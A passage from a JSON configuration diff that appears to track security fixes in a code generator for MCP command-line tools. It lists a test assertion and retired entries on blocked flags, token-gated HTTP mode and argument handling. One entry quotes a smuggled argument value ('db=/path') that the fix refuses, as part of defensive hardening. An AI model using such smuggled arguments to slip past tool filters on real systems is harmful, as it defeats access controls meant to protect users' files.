+   "spec_encode_followup": "Press-side: generate the destructive-call hang check on the context deadline in the cobratree shellout test template (identical in every connector).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout_test.go",
+     "contains": "if ctx.Err() != nil {\n\t\tt.Fatalf(\"destructive call hung until its deadline (%s)\", time.Since(start))",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout_test.go",
+     "not_contains": "if time.Since(start) > 2*time.Second {"
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "env-oauth-secrets-not-persisted",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 keeps the environment markers through SaveTokens and generates MarkCredentialsExplicit, so a client ID or secret read from the environment is never written by a token save."
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
